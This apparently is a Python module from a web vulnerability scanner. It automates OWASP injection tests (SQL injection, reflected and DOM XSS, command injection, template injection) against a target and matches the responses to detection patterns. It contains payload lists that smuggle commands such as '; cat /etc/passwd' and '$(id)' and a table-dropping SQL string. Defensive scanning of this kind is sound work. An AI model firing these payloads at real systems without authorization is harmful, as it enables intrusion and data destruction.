"""OWASP Injection & XSS testing service.

Provides automated testing for:
- SQL Injection (error-based, blind boolean, blind time-based)
- Cross-Site Scripting (reflected, stored, DOM-based)
- Command Injection
- LDAP Injection
- Template Injection (SSTI)

Uses Caido for server-side injection tests (replay HTTP) and
DevTools headless browser for DOM XSS / client-side verification.
"""

from __future__ import annotations

import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Awaitable

logger = logging.getLogger(__name__)


# ═══════════════════════════════════════════════════════════════
# Payloads
# ═══════════════════════════════════════════════════════════════

SQLI_ERROR_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "1' ORDER BY 100--",
    "'; DROP TABLE test--",
    "' UNION SELECT NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
]

SQLI_ERROR_PATTERNS = [
    r"SQL syntax",
    r"mysql_",
    r"pg_query",
    r"ORA-\d{5}",
    r"sqlite3?\.",
    r"SQLSTATE",
    r"syntax error",
    r"Unclosed quotation mark",
    r"unterminated string",
    r"Microsoft OLE DB",
    r"ODBC SQL Server Driver",
    r"PostgreSQL.*ERROR",
    r"Syntax error or access violation",
    r"You have an error in your SQL syntax",
    r"Warning.*mysql_",
    r"Warning.*pg_",
    r"valid MySQL result",
    r"MySqlClient\.",
    r"com\.mysql\.jdbc",
    r"org\.postgresql\.util\.PSQLException",
]

SQLI_BLIND_TIME_PAYLOADS = [
    "' AND SLEEP(3)--",
    "\" AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "' AND pg_sleep(3)--",
    "1; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--",
]

XSS_REFLECTED_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<details open ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    "'-alert(1)-'",
    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
]

XSS_CANARY = "WPXSS"
XSS_CANARY_PAYLOADS = [
    f"{XSS_CANARY}{{0}}",  # simple reflection test
    f"<{XSS_CANARY}{{0}}>",  # in HTML context
    f"'{XSS_CANARY}{{0}}'",  # in JS string context
]

COMMAND_INJECTION_PAYLOADS = [
    "; id",
    "| id",
    "|| id",
    "&& id",
    "$(id)",
    "`id`",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "127.0.0.1; id",
    "127.0.0.1 && id",
]

COMMAND_INJECTION_PATTERNS = [
    r"uid=\d+",
    r"root:.*:0:0",
    r"/bin/(ba)?sh",
    r"www-data",
    r"Permission denied",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{config}}",
    "{{self.__class__}}",
    "${T(java.lang.Runtime).getRuntime()}",
]

SSTI_PATTERNS = [
    r"\b49\b",  # 7*7
    r"<Config",
    r"__class__",
    r"java\.lang\.Runtime",
    r"SECRET_KEY",
]


# ═══════════════════════════════════════════════════════════════
# Data structures
# ═══════════════════════════════════════════════════════════════


@dataclass
class InjectionFinding:
    """A verified injection finding."""

    vuln_type: str  # sqli, xss_reflected, xss_dom, cmdi, ssti
    title: str
    severity: str  # critical, high, medium, low, info
    url: str
    param: str
    payload: str
    evidence: str
    request_id: str | None = None


@dataclass
class InjectionTestResult:
    """Result of an injection test campaign."""

    target_url: str
    test_type: str
    findings: list[InjectionFinding] = field(default_factory=list)
    requests_sent: int = 0
    errors: list[str] = field(default_factory=list)
    elapsed_seconds: float = 0.0

    def to_dict(self) -> dict[str, Any]:
        return {
            "target_url": self.target_url,
            "test_type": self.test_type,
            "findings_count": len(self.findings),
            "requests_sent": self.requests_sent,
            "elapsed_seconds": self.elapsed_seconds,
            "findings": [
                {
                    "vuln_type": f.vuln_type,
                    "title": f.title,
                    "severity": f.severity,
                    "url": f.url,
                    "param": f.param,
                    "payload": f.payload,
                    "evidence": f.evidence[:500],
                    "request_id": f.request_id,
                }
                for f in self.findings
            ],
            "errors": self.errors,
        }


# ═══════════════════════════════════════════════════════════════
# Helper: build HTTP request
# ═══════════════════════════════════════════════════════════════


def _build_get_request(
    path: str, host: str, param: str, value: str,
    cookie: str = "", extra_params: dict[str, str] | None = None,
) -> str:
    """Build a raw GET request with an injected parameter."""
    from urllib.parse import quote
    encoded = quote(value, safe="")
    qs = f"{param}={encoded}"
    if extra_params:
        for k, v in extra_params.items():
            qs += f"&{k}={quote(v, safe='')}"
    headers = f"GET {path}?{qs} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: WebPhomet/1.0\r\nAccept: */*"
    if cookie:
        headers += f"\r\nCookie: {cookie}"
    return headers + "\r\n\r\n"


def _build_post_request(path: str, host: str, params: dict[str, str], cookie: str = "") -> str:
    """Build a raw POST request with injected body params."""
    from urllib.parse import quote
    body_parts = [f"{k}={quote(v, safe='')}" for k, v in params.items()]
    body = "&".join(body_parts)
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: WebPhomet/1.0\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Accept: */*"
    )
    if cookie:
        headers += f"\r\nCookie: {cookie}"
    return headers + "\r\n\r\n" + body


# ═══════════════════════════════════════════════════════════════
# Test: SQL Injection
# ═══════════════════════════════════════════════════════════════


async def test_sqli(
    send_fn: Callable[..., Awaitable[dict[str, Any]]],
    host: str,
    port: int,
    is_tls: bool,
    path: str,
    param: str,
    method: str = "GET",
    cookie: str = "",
    extra_params: dict[str, str] | None = None,
) -> InjectionTestResult:
    """Test for SQL injection (error-based + blind time-based)."""
    start = time.time()
    result = InjectionTestResult(
        target_url=f"{'https' if is_tls else 'http'}://{host}:{port}{path}",
        test_type="sqli",
    )
    host_header = f"{host}:{port}" if port not in (80, 443) else host

    # ── Error-based SQLi ──
    for payload in SQLI_ERROR_PAYLOADS:
        try:
            if method == "GET":
                raw = _build_get_request(path, host_header, param, payload, cookie, extra_params)
            else:
                params = {param: payload}
                if extra_params:
                    params.update(extra_params)
                raw = _build_post_request(path, host_header, params, cookie)

            resp = await send_fn(raw, host, port, is_tls)
            result.requests_sent += 1
            body = resp.get("body", "")
            req_id = resp.get("id") or resp.get("request_id")

            for pattern in SQLI_ERROR_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    result.findings.append(InjectionFinding(
                        vuln_type="sqli",
                        title=f"SQL Injection (error-based) in {param}",
                        severity="critical",
                        url=result.target_url,
                        param=param,
                        payload=payload,
                        evidence=f"Pattern '{pattern}' matched in response",
                        request_id=req_id,
                    ))
                    break
        except Exception as exc:
            result.errors.append(f"SQLi error-based {payload[:30]}: {exc}")

    # ── Blind time-based SQLi ──
    for payload in SQLI_BLIND_TIME_PAYLOADS:
        try:
            if method == "GET":
                raw = _build_get_request(path, host_header, param, payload, cookie, extra_params)
            else:
                params = {param: payload}
                if extra_params:
                    params.update(extra_params)
                raw = _build_post_request(path, host_header, params, cookie)

            t0 = time.time()
            resp = await send_fn(raw, host, port, is_tls)
            elapsed = time.time() - t0
            result.requests_sent += 1
            req_id = resp.get("id") or resp.get("request_id")

            if elapsed >= 2.5:  # 3s sleep, allow 0.5s margin
                result.findings.append(InjectionFinding(
                    vuln_type="sqli",
                    title=f"SQL Injection (blind time-based) in {param}",
                    severity="critical",
                    url=result.target_url,
                    param=param,
                    payload=payload,
                    evidence=f"Response delayed {elapsed:.1f}s (expected ~3s)",
                    request_id=req_id,
                ))
        except Exception as exc:
            result.errors.append(f"SQLi blind {payload[:30]}: {exc}")

    result.elapsed_seconds = time.time() - start
    return result


# ═══════════════════════════════════════════════════════════════
# Test: Reflected XSS
# ═══════════════════════════════════════════════════════════════


async def test_xss_reflected(
    send_fn: Callable[..., Awaitable[dict[str, Any]]],
    host: str,
    port: int,
    is_tls: bool,
    path: str,
    param: str,
    method: str = "GET",
    cookie: str = "",
    extra_params: dict[str, str] | None = None,
) -> InjectionTestResult:
    """Test for reflected XSS via Caido replay."""
    start = time.time()
    result = InjectionTestResult(
        target_url=f"{'https' if is_tls else 'http'}://{host}:{port}{path}",
        test_type="xss_reflected",
    )
    host_header = f"{host}:{port}" if port not in (80, 443) else host

    for payload in XSS_REFLECTED_PAYLOADS:
        try:
            if method == "GET":
                raw = _build_get_request(path, host_header, param, payload, cookie, extra_params)
            else:
                params = {param: payload}
                if extra_params:
                    params.update(extra_params)
                raw = _build_post_request(path, host_header, params, cookie)

            resp = await send_fn(raw, host, port, is_tls)
            result.requests_sent += 1
            body = resp.get("body", "")
            req_id = resp.get("id") or resp.get("request_id")

            # Check if payload appears unfiltered in response
            if payload in body:
                result.findings.append(InjectionFinding(
                    vuln_type="xss_reflected",
                    title=f"Reflected XSS in {param}",
                    severity="high",
                    url=result.target_url,
                    param=param,
                    payload=payload,
                    evidence=f"Payload reflected verbatim in response body",
                    request_id=req_id,
                ))
            # Check for partial reflection (tag injection)
            elif "<" in payload and re.search(
                re.escape(payload.split(">")[0]) if ">" in payload else re.escape(payload),
                body,
            ):
                result.findings.append(InjectionFinding(
                    vuln_type="xss_reflected",
                    title=f"Reflected XSS (partial) in {param}",
                    severity="high",
                    url=result.target_url,
                    param=param,
                    payload=payload,
                    evidence="Payload partially reflected (HTML tags present in response)",
                    request_id=req_id,
                ))
        except Exception as exc:
            result.errors.append(f"XSS reflected {payload[:30]}: {exc}")

    result.elapsed_seconds = time.time() - start
    return result


# ═══════════════════════════════════════════════════════════════
# Test: DOM XSS (via DevTools)
# ═══════════════════════════════════════════════════════════════


async def test_xss_dom(
    devtools_call: Callable[..., Awaitable[dict[str, Any]]],
    base_url: str,
    param: str,
) -> InjectionTestResult:
    """Test for DOM-based XSS using headless Chrome.

    Navigates with canary payloads in the URL parameter, then checks
    if the canary appears in dangerous DOM sinks.
    """
    start = time.time()
    result = InjectionTestResult(target_url=base_url, test_type="xss_dom")

    canary_id = 0
    for payload_template in XSS_CANARY_PAYLOADS:
        canary_id += 1
        canary = payload_template.format(canary_id)

        from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
        parsed = urlparse(base_url)
        qs = parse_qs(parsed.query)
        qs[param] = [canary]
        new_query = urlencode(qs, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))

        try:
            nav = await devtools_call("navigate", {"url": test_url})
            result.requests_sent += 1

            if "error" in nav:
                continue

            # Check if canary appears in page HTML
            html_result = await devtools_call("get_html", {})
            html = html_result.get("html", "")

            if canary in html:
                # Check DOM sinks
                sinks = await devtools_call("detect_dom_xss_sinks", {})
                sink_list = sinks.get("sinks", [])

                result.findings.append(InjectionFinding(
                    vuln_type="xss_dom",
                    title=f"Potential DOM XSS via {param}",
                    severity="high" if sink_list else "medium",
                    url=test_url,
                    param=param,
                    payload=canary,
                    evidence=(
                        f"Canary '{canary}' reflected in DOM. "
                        f"Sinks found: {len(sink_list)}"
                    ),
                ))

            # Also try to execute JS to check for DOM manipulation
            js_check = await devtools_call("execute_js", {
                "script": f"document.body.innerHTML.includes('{XSS_CANARY}')"
            })
            if js_check.get("result") is True:
                if not any(f.payload == canary for f in result.findings):
                    result.findings.append(InjectionFinding(
                        vuln_type="xss_dom",
                        title=f"DOM XSS (JS-confirmed) via {param}",
                        severity="high",
                        url=test_url,
                        param=param,
                        payload=canary,
                        evidence="Canary confirmed in DOM via JavaScript execution",
                    ))

        except Exception as exc:
            result.errors.append(f"DOM XSS {canary}: {exc}")

    result.elapsed_seconds = time.time() - start
    return result


# ═══════════════════════════════════════════════════════════════
# Test: Command Injection
# ═══════════════════════════════════════════════════════════════


async def test_command_injection(
    send_fn: Callable[..., Awaitable[dict[str, Any]]],
    host: str,
    port: int,
    is_tls: bool,
    path: str,
    param: str,
    method: str = "GET",
    cookie: str = "",
    extra_params: dict[str, str] | None = None,
) -> InjectionTestResult:
    """Test for OS command injection."""
    start = time.time()
    result = InjectionTestResult(
        target_url=f"{'https' if is_tls else 'http'}://{host}:{port}{path}",
        test_type="command_injection",
    )
    host_header = f"{host}:{port}" if port not in (80, 443) else host

    for payload in COMMAND_INJECTION_PAYLOADS:
        try:
            if method == "GET":
                raw = _build_get_request(path, host_header, param, payload, cookie, extra_params)
            else:
                params = {param: payload}
                if extra_params:
                    params.update(extra_params)
                raw = _build_post_request(path, host_header, params, cookie)

            resp = await send_fn(raw, host, port, is_tls)
            result.requests_sent += 1
            body = resp.get("body", "")
            req_id = resp.get("id") or resp.get("request_id")

            for pattern in COMMAND_INJECTION_PATTERNS:
                if re.search(pattern, body):
                    result.findings.append(InjectionFinding(
                        vuln_type="command_injection",
                        title=f"Command Injection in {param}",
                        severity="critical",
                        url=result.target_url,
                        param=param,
                        payload=payload,
                        evidence=f"Pattern '{pattern}' matched in response",
                        request_id=req_id,
                    ))
                    break
        except Exception as exc:
            result.errors.append(f"CmdI {payload[:30]}: {exc}")

    result.elapsed_seconds = time.time() - start
    return result


# ═══════════════════════════════════════════════════════════════
# Test: Server-Side Template Injection
# ═══════════════════════════════════════════════════════════════


async def test_ssti(
    send_fn: Callable[..., Awaitable[dict[str, Any]]],
    host: str,
    port: int,
    is_tls: bool,
    path: str,
    param: str,
    method: str = "GET",
    cookie: str = "",
    extra_params: dict[str, str] | None = None,
) -> InjectionTestResult:
    """Test for Server-Side Template Injection."""
    start = time.time()
    result = InjectionTestResult(
        target_url=f"{'https' if is_tls else 'http'}://{host}:{port}{path}",
        test_type="ssti",
    )
    host_header = f"{host}:{port}" if port not in (80, 443) else host

    for payload in SSTI_PAYLOADS:
        try:
            if method == "GET":
                raw = _build_get_request(path, host_header, param, payload, cookie, extra_params)
            else:
                params = {param: payload}
                if extra_params:
                    params.update(extra_params)
                raw = _build_post_request(path, host_header, params, cookie)

            resp = await send_fn(raw, host, port, is_tls)
            result.requests_sent += 1
            body = resp.get("body", "")
            req_id = resp.get("id") or resp.get("request_id")

            for pattern in SSTI_PATTERNS:
                if re.search(pattern, body):
                    result.findings.append(InjectionFinding(
                        vuln_type="ssti",
                        title=f"Server-Side Template Injection in {param}",
                        severity="critical",
                        url=result.target_url,
                        param=param,
                        payload=payload,
                        evidence=f"Pattern '{pattern}' matched in response",
                        request_id=req_id,
                    ))
                    break
        except Exception as exc:
            result.errors.append(f"SSTI {payload[:30]}: {exc}")

    result.elapsed_seconds = time.time() - start
    return result


# ═══════════════════════════════════════════════════════════════
# Combined OWASP injection test suite
# ═══════════════════════════════════════════════════════════════


INJECTION_TESTS = {
    "sqli": test_sqli,
    "xss_reflected": test_xss_reflected,
    "xss_dom": test_xss_dom,
    "command_injection": test_command_injection,
    "ssti": test_ssti,
}


async def run_injection_suite(
    send_fn: Callable[..., Awaitable[dict[str, Any]]],
    devtools_call: Callable[..., Awaitable[dict[str, Any]]],
    host: str,
    port: int,
    is_tls: bool,
    targets: list[dict[str, Any]],
    test_types: list[str] | None = None,
    cookie: str = "",
) -> list[InjectionTestResult]:
    """Run a suite of injection tests against discovered parameters.

    Parameters
    ----------
    send_fn: async (raw_request, host, port, is_tls) → response dict
    devtools_call: async (method, params) → result dict
    host, port, is_tls: Target connection info.
    targets: List of dicts with {path, param, method, extra_params}.
    test_types: Tests to run (default: all). One of sqli, xss_reflected,
        xss_dom, command_injection, ssti.
    cookie: Session cookie string for authenticated testing.
    """
    if test_types is None:
        test_types = ["sqli", "xss_reflected", "command_injection", "ssti"]

    results: list[InjectionTestResult] = []

    for target in targets:
        path = target.get("path", "/")
        param = target.get("param", "id")
        method = target.get("method", "GET")
        extra_params = target.get("extra_params")

        for test_type in test_types:
            if test_type == "xss_dom":
                # DOM XSS uses DevTools directly
                base_url = f"{'https' if is_tls else 'http'}://{host}:{port}{path}"
                tr = await test_xss_dom(devtools_call, base_url, param)
                results.append(tr)
            elif test_type in INJECTION_TESTS:
                fn = INJECTION_TESTS[test_type]
                tr = await fn(
                    send_fn=send_fn,
                    host=host,
                    port=port,
                    is_tls=is_tls,
                    path=path,
                    param=param,
                    method=method,
                    cookie=cookie,
                    extra_params=extra_params,
                )
                results.append(tr)
            else:
                logger.warning("Unknown test type: %s", test_type)

    return results
